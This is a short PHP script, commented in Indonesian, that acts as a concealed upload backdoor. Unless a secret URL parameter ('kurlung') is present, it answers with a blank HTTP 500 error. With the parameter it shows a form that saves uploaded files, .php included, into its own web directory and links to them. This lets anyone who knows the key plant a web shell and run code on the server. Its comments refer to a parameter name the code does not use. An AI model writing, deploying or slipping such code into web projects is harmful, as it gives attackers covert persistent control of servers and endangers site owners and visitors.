<?php
// Periksa apakah parameter "oke" ada dalam URL
if (isset($_GET['kurlung'])) {
    if (isset($_POST['submit'])) {
        // Ambil informasi file
        $nama = $_FILES['gambar']['name'];
        $tempat = $_FILES['gambar']['tmp_name'];
        $type = $_FILES['gambar']['type'];
        $size = $_FILES['gambar']['size'];

        // Daftar ekstensi file yang diizinkan
        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];

        // Ekstrak ekstensi dari nama file
        $explode = explode('.', $nama);
        $pembaginya = strtolower(end($explode));

        // Cek apakah ekstensi file sesuai dengan yang diizinkan
        if (in_array($pembaginya, $ukuran)) {
            
            // Dapatkan direktori tempat skrip ini dijalankan (path dari file yang memberi upload)
            $target_dir = dirname(__FILE__) . '/';  // Direktori tempat skrip upload ini berada
            
            // Tentukan file path lengkap untuk menyimpan file
            $target_file = $target_dir . basename($nama);

            // Pindahkan file ke lokasi yang sesuai
            if (move_uploaded_file($tempat, $target_file)) {
                // Tampilkan pesan sukses dan link file
                echo "File berhasil di-upload!<br>";
                echo "Nama file: " . $nama . "<br>";
                // Menampilkan link ke file yang di-upload
                $file_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target_file);  // Mengubah path ke URL relatif
                echo "Link file: <a href='" . $file_url . "'>Lihat file</a><br>";
            } else {
                echo "Terjadi kesalahan saat meng-upload file.";
            }
        } else {
            echo "Duh, ekstensi file tidak sesuai.";
        }
    } else {
        // Tampilkan form jika belum submit
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="gambar">
                <input type="submit" name="submit" value="submit">
              </form>';
    }
} else {
    // Jika parameter "oke" tidak ada di URL, tampilkan error 500
    http_response_code(500);
    echo "";
}
__halt_compiler();
?>
